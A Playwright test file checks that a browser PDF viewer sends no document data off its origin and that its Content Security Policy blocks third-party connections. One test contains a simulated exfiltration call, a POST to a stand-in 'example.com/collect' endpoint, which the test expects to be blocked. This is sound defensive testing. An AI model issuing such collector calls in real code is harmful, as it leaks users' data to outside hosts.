import { expect, test } from '@playwright/test';
import { readFileSync } from 'node:fs';
import { fixturePath, openWithPicker, waitForRenderedPage } from './helpers';

test.describe('privacy (7.3)', () => {
  test('no request leaves our origin or carries document data', async ({ page, baseURL }) => {
    const origin = new URL(baseURL ?? '').origin;
    const requests: { url: string; method: string; body: string | null; afterOpen: boolean }[] = [];
    let opened = false;
    page.on('request', (r) => requests.push({ url: r.url(), method: r.method(), body: r.postData(), afterOpen: opened }));

    await page.goto('/');
    opened = true;
    await openWithPicker(page, fixturePath('valid.pdf'));
    await waitForRenderedPage(page, 0);
    await page.getByRole('button', { name: 'Zoom in' }).click();
    await page.getByRole('button', { name: 'Fit to page' }).click();
    await page.waitForTimeout(300);

    const external = requests.filter((r) => !r.url.startsWith(origin) && !r.url.startsWith('blob:') && !r.url.startsWith('data:'));
    expect(external).toEqual([]);
    // Document bytes never appear in a request: only GETs of app assets after opening.
    const fixture = readFileSync(fixturePath('valid.pdf')).toString('latin1').slice(0, 64);
    for (const r of requests.filter((r) => r.afterOpen)) {
      expect(r.method).toBe('GET');
      expect(r.body ?? '').not.toContain(fixture);
      expect(r.url).not.toContain('valid.pdf');
    }
  });

  test('CSP blocks a scripted connection to a third-party origin', async ({ page }) => {
    await page.goto('/');
    const result = await page.evaluate(async () => {
      const violations: string[] = [];
      document.addEventListener('securitypolicyviolation', (e) => violations.push(e.violatedDirective));
      try {
        await fetch('https://example.com/collect', { method: 'POST', body: 'x' });
        return { blocked: false, violations };
      } catch {
        await new Promise((r) => setTimeout(r, 50));
        return { blocked: true, violations };
      }
    });
    expect(result.blocked).toBe(true);
    expect(result.violations).toContain('connect-src');
  });
});
